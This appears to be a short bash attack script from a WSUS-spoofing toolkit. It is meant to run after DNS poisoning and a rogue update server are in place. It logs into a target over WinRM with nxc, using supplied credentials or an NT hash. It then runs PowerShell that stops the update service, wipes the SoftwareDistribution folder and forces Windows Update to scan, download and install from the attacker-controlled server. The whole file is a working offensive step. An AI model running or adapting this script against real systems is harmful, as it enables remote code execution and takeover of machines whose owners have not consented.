#!/bin/bash
# trigger_wu.sh — force the target (WinRM reachable) to scan→download→install
# from its configured WSUS server. Run AFTER DNS is poisoned and rogue WSUS is up.
#
# Usage: trigger_wu.sh <target_ip> <auth>
#   <auth> is extra nxc args, e.g.:
#     -u 'DOMAIN\user' -p 'pw'
#     -u 'msa$' -H <nt-hash>
set -euo pipefail
TARGET="${1:?target IP}"
shift

PS='try { Stop-Service wuauserv -Force -ErrorAction SilentlyContinue } catch {};
Remove-Item "C:\Windows\SoftwareDistribution" -Recurse -Force -ErrorAction SilentlyContinue;
Start-Service wuauserv -ErrorAction SilentlyContinue;
wuauclt /resetauthorization /detectnow 2>&1;
usoclient StartScan 2>&1;
Start-Sleep 5;
usoclient StartDownload 2>&1;
Start-Sleep 3;
usoclient StartInstall 2>&1;
Get-Service wuauserv | Select Name,Status'

nxc winrm "$TARGET" "$@" -X "$PS"
